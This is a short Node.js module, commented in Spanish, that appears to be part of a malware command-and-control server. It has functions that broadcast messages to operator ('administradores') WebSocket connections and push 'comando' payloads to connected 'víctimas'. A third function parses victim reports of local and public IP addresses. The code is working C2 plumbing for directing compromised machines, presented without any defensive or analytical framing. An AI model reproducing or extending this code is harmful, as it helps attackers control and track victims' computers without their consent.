// Función para enviar mensajes a todos los administradores
function enviarMensajeAAdministradores(administradores, tipo, contenido) {
    const administradoresRegistrados = Object.keys(administradores);

    if (administradoresRegistrados.length === 0) {
        console.log("No hay administradores registrados para enviar el mensaje.");
        return;
    }

    // Enviar mensaje a todos los administradores conectados
    Object.values(administradores).forEach(admin => {
        if (admin.readyState === admin.OPEN) {
            admin.send(JSON.stringify({ tipo: tipo, cuerpo: contenido }));
        } else {
            console.log(`No se pudo enviar, WebSocket en estado: ${admin.readyState}`);
        }
    });
}

function enviarMensajeAVictimas(victimas, tipo, contenido) {
    const victimasRegistradas = Object.keys(victimas);

    if (victimasRegistradas.length === 0) {
        console.log("No hay víctimas registradas para enviar el mensaje.");
        return;
    }

    // Enviar mensaje a todas las víctimas conectadas
    victimasRegistradas.forEach(victimaId => {
        const victima = victimas[victimaId];
        if (victima.readyState === victima.OPEN) {
            victima.send(JSON.stringify({ tipo: tipo, comando: contenido }));
        } else {
            console.log(`No se pudo enviar, WebSocket en estado: ${victima.readyState}`);
        }
    });
}



// Función para convertir la cadena "map[ipLocal:192.168.1.50 ipPublica:138.84.38.149 ...]" en un objeto JavaScript
function convertirCadenaAMapa(cadena) {
    // Elimina "map[" y el "]" final
    let cadenaLimpia = cadena.replace(/^map\[/, '').replace(/\]$/, '');

    // Divide por espacios para separar cada par clave-valor
    let pares = cadenaLimpia.split(' ');

    // Convierte los pares clave-valor en un objeto
    let objeto = {};
    pares.forEach(par => {
        let [clave, valor] = par.split(':');
        if (clave && valor) {
            objeto[clave] = valor;
        }
    });

    return objeto;
}


module.exports = {
    enviarMensajeAAdministradores, convertirCadenaAMapa,enviarMensajeAVictimas
};
